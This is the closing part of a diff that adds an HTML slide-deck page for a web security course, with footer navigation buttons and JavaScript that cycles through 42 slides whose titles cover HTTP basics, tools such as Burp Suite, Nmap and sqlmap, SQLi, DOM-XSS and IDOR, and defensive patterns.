+                    <div id="deck-progress-bar" class="absolute left-0 top-0 h-full bg-cyber-green w-1/42 transition-all duration-300"></div>
+                </div>
+                <span id="deck-slide-indicator" class="text-xs font-mono text-white font-bold">01 / 42</span>
+            </div>
+
+            <div class="flex gap-2">
+                <button onclick="prevSlide()" class="px-3 py-1.5 border border-cyber-border hover:border-zinc-500 rounded text-xs font-mono text-zinc-400 hover:text-white transition">
+                    PREV
+                </button>
+                <button onclick="nextSlide()" class="px-3 py-1.5 border border-cyber-border hover:border-zinc-500 rounded text-xs font-mono text-zinc-400 hover:text-white transition">
+                    NEXT
+                </button>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        let currentSlideIdx = 0;
+        const totalSlides = 42;
+        
+        const metaSubjects = [
+            "MODULE 01: INTRODUCTION",
+            "MODULE 01: SYSTEM TRUTHS",
+            "MODULE 01: THE DISTRIBUTED WEB",
+            "MODULE 01: CLIENT & SERVER NODES",
+            "MODULE 01: THE HTTP REQUEST",
+            "MODULE 01: THE HTTP RESPONSE",
+            "MODULE 01: STATELESS ARCHITECTURE",
+            "MODULE 01: TRUST BOUNDARIES",
+            "MODULE 01: WEB SEC BASICS",
+            "MODULE 01: THE GOLDEN RULE",
+            "MODULE 02: THE BREACH IMPACT",
+            "MODULE 02: THE BREACH IMPACT",
+            "MODULE 02: THE BREACH IMPACT",
+            "MODULE 03: INSTRUMENTATION",
+            "MODULE 03: cURL ANALYSIS",
+            "MODULE 03: cURL CONSOLE",
+            "MODULE 03: BURP SUITE INTERCEPT",
+            "MODULE 03: BURP SUITE FLOW",
+            "MODULE 03: GOBUSTER RECON",
+            "MODULE 03: GOBUSTER CONSOLE",
+            "MODULE 03: NMAP NETWORK MAP",
+            "MODULE 03: NMAP CONSOLE",
+            "MODULE 03: SQLMAP AUTOMATION",
+            "MODULE 03: SQLMAP CONSOLE",
+            "MODULE 04: SQLi EXPLORATION",
+            "MODULE 04: SQLi EXPLORATION",
+            "MODULE 04: SQLi EXPLORATION",
+            "MODULE 04: SQLi MITIGATION",
+            "MODULE 04: DOM-XSS EXPLORATION",
+            "MODULE 04: DOM-XSS EXPLORATION",
+            "MODULE 04: DOM-XSS EXPLORATION",
+            "MODULE 04: DOM-XSS MITIGATION",
+            "MODULE 04: IDOR EXPLORATION",
+            "MODULE 04: IDOR EXPLORATION",
+            "MODULE 04: IDOR EXPLORATION",
+            "MODULE 04: IDOR MITIGATION",
+            "MODULE 05: DEFENSIVE PATTERNS",
+            "MODULE 05: SECURE ARCHITECTURE",
+            "MODULE 05: DEFENSIVE TOOLING",
+            "MODULE 05: SHIFTING LEFT",
+            "MODULE 05: DEFENSIVE CONCEPTS",
+            "MODULE 05: COMPLETE ANALYSIS"
+        ];
+
+
+        function showSlide(index) {
+            // Un-active current active slide panel
+            document.getElementById(`slide-${currentSlideIdx + 1}`).classList.remove('active');
+            
+            // Set boundary conditions
+            currentSlideIdx = index;
+            if (currentSlideIdx < 0) currentSlideIdx = 0;
+            if (currentSlideIdx >= totalSlides) currentSlideIdx = totalSlides - 1;
+
+            // Activate new active slide target panel
+            document.getElementById(`slide-${currentSlideIdx + 1}`).classList.add('active');
+
+            // Update footer indications & tracking loops
+            document.getElementById('deck-slide-indicator').innerText = `${String(currentSlideIdx + 1).padStart(2, '0')} / ${String(totalSlides).padStart(2, '0')}`;
+            document.getElementById('deck-topic-meta').innerText = metaSubjects[currentSlideIdx];
+
+            const barPercent = ((currentSlideIdx + 1) / totalSlides) * 100;
+            document.getElementById('deck-progress-bar').style.width = `${barPercent}%`;
+        }
+
+        function nextSlide() {
+            if (currentSlideIdx < totalSlides - 1) {
+                showSlide(currentSlideIdx + 1);
+            }
+        }
+
+        function prevSlide() {
+            if (currentSlideIdx > 0) {
+                showSlide(currentSlideIdx - 1);
+            }
+        }
+
+        // Global Event Key listeners for easy presentation navigation
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') {
+                e.preventDefault();
+                nextSlide();
+            }
+            if (e.key === 'ArrowLeft') {
+                e.preventDefault();
+                prevSlide();
+            }
+        });
+
+        // Initialize presentation stack loop on load
+        showSlide(0);
+    </script>
+</body>
+</html>
